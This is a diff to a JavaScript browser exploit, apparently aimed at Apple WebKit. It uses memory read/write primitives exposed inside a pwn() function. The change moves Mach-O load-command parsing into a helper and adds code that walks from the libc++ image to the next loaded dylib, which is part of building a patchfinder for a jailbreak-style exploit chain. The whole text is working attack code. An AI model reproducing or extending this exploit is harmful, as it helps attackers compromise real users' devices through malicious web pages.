@@ -137,6 +137,25 @@ function follow_adrpLdr(addr)
     return ret;
 }
 
+function get_dylib_name(macho_base) {
+    var lc = Add(macho_base, 0x20);
+    var lc_cmd;
+    while(true) {
+        lc_cmd = read32(lc)
+        if(lc_cmd == 0xd) {
+            // log(`[+] Found LC_ID_DYLIB at: ${lc}`);
+            break;
+        }
+
+        var cmdsize = read32(Add(lc, 0x4));
+        lc = Add(lc, cmdsize)
+    }
+    var dylib_name_offset = read32(Add(lc, 8));
+    var dylib_name_addr = Add(lc, dylib_name_offset);
+    var dylib_name = readString(dylib_name_addr);
+    return dylib_name;
+}
+
 function pwn() {
     offsets.resolve();
 
@@ -250,6 +269,7 @@ function pwn() {
     window.read32 = read32;
     window.read64 = read64;
     window.write64 = write64;
+    window.readString = readString;
     
     var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
     var FPO = spectre ? 0x18 : 0x10; 
@@ -326,24 +346,17 @@ function pwn() {
     }
     log(`[+] libcpp_base: ${libcpp1_base}, try_count: ${try_count}`);
     
-    var lc = Add(libcpp1_base, 0x20);
-    var lc_cmd;
-    while(true) {
-        lc_cmd = read32(lc)
-        if(lc_cmd == 0xd) {   //__LINKED (__LINKEDIT)
-            log(`[+] Found LC_ID_DYLIB at: ${lc}`);
-            break;
-        }
+    var dylib_name = get_dylib_name(libcpp1_base);
+    log(`[*] dylib_name: ${dylib_name}`);
 
-        var cmdsize = read32(Add(lc, 0x4));
-        lc = Add(lc, cmdsize)
-    }
-    var dylib_name_offset = read32(Add(lc, 8));
-    log(`[+] dylib_name_offset: ${dylib_name_offset}`);
-    var dylib_name_addr = Add(lc, dylib_name_offset);
-    log(`[+] dylib_name_addr: ${dylib_name_addr}`);
-    var dylib_name = readString(dylib_name_addr);
-    log(`[+] dylib_name: ${dylib_name}`);
+    var libcpp_vm_size = read64(Add(libcpp1_base, 0x40))
+    log(`[+] libcpp_vm_size: ${libcpp_vm_size}`);
+
+    var next_dylib = Add(libcpp1_base, libcpp_vm_size)
+    log(`[+] read64 next_dylib: ${read64(next_dylib)}`);
+
+    dylib_name = get_dylib_name(next_dylib);
+    log(`[*] dylib_name: ${dylib_name}`);
 
 
     // remove this "return" if finished patchfinder
